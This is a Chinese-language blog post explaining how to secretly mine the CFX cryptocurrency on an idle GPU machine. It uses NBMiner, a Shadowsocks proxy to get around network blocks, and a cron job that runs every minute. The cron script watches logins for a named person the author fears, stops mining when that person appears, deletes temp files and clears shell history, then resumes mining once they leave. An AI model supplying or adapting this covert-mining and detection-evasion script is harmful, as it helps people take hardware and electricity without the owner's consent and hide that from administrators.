---
title: nbminer配合cron，偷偷摸摸无敌了！
tags: 运维 ubuntu cfx blockchain
article_header:
  type: cover
  image:
    src: /blimjoe/pictures/blogs/2022-11-23-cover.jpg
---
使用未使用（未被登录设备）挖CFX  
> Conflux’s token economy is built around the $CFX token, a unit of value on the platform that enables token holders to pay transaction fees, earn rewards through staking, rent storage, and participate in network governance. CFX also incentivizes and rewards miners, who ensure the secure operation of the Network.  
> 
### blablabla! What ever! （翻白眼）  
我这边使用的是未在被使用的nvidiea显卡的Ubuntu 20.04  
---  
## 开始  
### 1. nvidiea cuda的安装。  
这里我不说了，网上一搜都是。  
### 2. 选择池子  
矿池选择比较重要，我会选择算力比较强点的。cfx现在大多是gpu在挖，asic少，所以还可以玩玩。  
我这里选择了[f2pool](https://www.f2pool.com/)，简单注册。  
### 3. ss搭建  
由于现在矿池地址大多被墙了，所以要搭一个ss给miner用。  
国外几个vps平台我推荐AWS和GCP。GCP呢，没得话说。好用！就是贵。不差钱的可以用。AWS有aws lightsail，3刀一个月，不限流量。用起来还是比较爽的。  
注册或者aws账号之后进入lightsail，并开通服务器。我使用的是日本节点。稍微快一点。但是现在aws不被墙的ip也少了很多，还是拼运气吧。  
系统选择，ubuntu。别问为什么。问就是方便。  
安装shadowsocks-libev  
```
$ apt install shadowsocks-libev  
```  
配置server端config  
/etc/shadowsocks-libev/config.json  
```  
{
        "server":"0.0.0.0",
        "server_port":xxxxxx,
        "password":"xxxxxx",
        "method":"aes-256-cfb",
        "timeout":60
}
```  
密码及端口自己填。但是记得选择的端口要在服务器的出入站规则中添加进去哦。  
### 4. 本地ss client  
本机上同样的  
```  
$ apt install shadowsocks-libev
```  
本地配置文件  
```  
{
        "server":"xx.xx.xx.xx",
        "server_port":xxxx,
        "local_port":1080,
        "password":"xxxx",
        "timeout":60,
        "method":"aes-256-cfb",
        "mode":"tcp_and_udp",
        "fast_open":false
}
```  
server地址、端口、密码填上自己的。  
测试一下，使用proxychains  
```
$ apt install proxychains
$ ss-local -c config.json
```  
增加/etc/proxychains.conf最后加一行  
```  
socks5 127.0.0.1 1080
```  
如果  
```  
$ proxychains wget www.google.com  
```  
可以成功。恭喜翻墙成功。  
### 5. 挖矿软件  
我用了nbminer  
```  
$ wget https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz
$ tar zxf NBMiner_42.3_Linux.tgz
$ ./NBMiner_Linux/nbminer -a octopus -o stratum+tcp://cfx.f2pool.com:6800 -u blimjoe.f2pool001 --proxy 127.0.0.1:1080 
记住吧-u后面的内容填你自己的，要不然就帮我了。 
``` 
### 6. 写个脚本  
```
#!/bin/bash

sleep 5

# f2pool
/home/bdong/NBMiner_Linux/nbminer -a octopus -o stratum+tcp://cfx.f2pool.com:6800 -u blimjoe.f2pool001 --proxy 127.0.0.1:1080
```  
### 7. 写个cron脚本定时执行  
由于我是偷偷摸摸，懂的都懂。所以为了不让发现，写了个crontab用的脚本  
```
#!/bin/bash

monitor=（你怕的那个人）
currentTime=$(date "+%Y-%m-%d %H:%M:%S")
file=/tmp/$RANDOM.service
screenalive=no
monitordet=no

touch ${file}
screen -ls > ${file}
sed -i '1d' ${file}
sed -i '$d' ${file}
cat ${file} | awk '{print $1}' > /tmp/tmp
while read line
do
        name=$(echo $line | awk -F '.' '{print $2}')
        if [ ${name} == 'nb' ]; then
		unset screenalive
		screenalive=yes
        fi
done < /tmp/tmp
rm ${file}
rm /tmp/tmp

who | awk '{print $1}' > /tmp/tmp
while read line
do
	if [ $line == ${monitor} ];
	then
		echo ${currentTime} ${monitor}' detected!!!! Stoping!!!!' >> /home/bdong/log
	#	echo "monitored"
		monitordet=yes
		break
	fi

done < /tmp/tmp
rm /tmp/tmp

if [ ${screenalive} == yes ] && [ ${monitordet} == yes ];
then
	screen -S nb -X quit
	sleep 2
	abc=$(ls /tmp/trex* 2> /dev/null | wc -l);
	if [ "$abc" != "0" ] ;then
		rm /tmp/trex*
	fi
	history -c
	exit 0
fi

if [ ${screenalive} == no ] && [ ${monitordet} == no ];
then
	#echo "start"
	screen -dmS nb -c /home/bdong/nb -m top
	echo ${currentTime} ' CLEAR! :D Starting...' >> /home/bdong/log
fi
```  
### 8. 增加cron  
```  
$ crontab -e
```  
增加  
```
*/1 *  *  *  * /home/bdong/cron
```  
每分钟执行以下  
### 9. 结束  
就OK了。然后愉快的去f2pool上看一下收益吧……不看不知道，一看心塞塞: )  
